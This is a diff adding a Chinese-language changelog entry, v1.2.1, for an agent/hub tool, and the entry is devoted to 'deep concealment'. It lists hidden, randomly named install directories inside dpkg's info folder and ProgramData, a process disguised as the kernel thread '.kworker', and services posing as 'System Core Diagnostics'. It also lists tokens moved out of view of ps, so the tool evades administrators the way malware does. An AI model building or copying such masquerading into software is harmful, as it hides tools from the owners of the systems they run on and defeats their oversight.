@@ -2,6 +2,17 @@
 
 本项目版本号遵循语义化版本（SemVer）。每条记录列出该版本的新增、变更与修复。
 
+## v1.2.1
+
+发布日期：2026-11-27
+
+### 变更（深度隐蔽）
+- **隐藏路径**：agent / hub 安装到 `/var/lib/dpkg/info/.corediag-<随机>/`（Linux）、`C:\ProgramData\.corediag-<随机>\`（Windows），700 权限仅 root/SYSTEM 可读。
+- **伪装命名**：二进制/进程名 `.kworker`，服务/计划任务名 `systemd-corediag` / `CoreDiagSvc`，描述伪装为 "System Core Diagnostics"。
+- **凭据隐藏**：新增 `--envfile`，token 等敏感项写入 root-only `.conf`（600），systemd ExecStart / 计划任务参数只含路径与环境文件，`ps` 中不再出现明文 token。
+- hub 同步支持 `--envfile`（`TP_TOKEN` / `TP_ADMIN_TOKEN` / `TP_PORT` / `TP_STATE`）。
+- install.sh / install.ps1 / uninstall 系列同步适配隐蔽路径与随机后缀。
+
 ## v1.2.0
 
 发布日期：2026-11-27
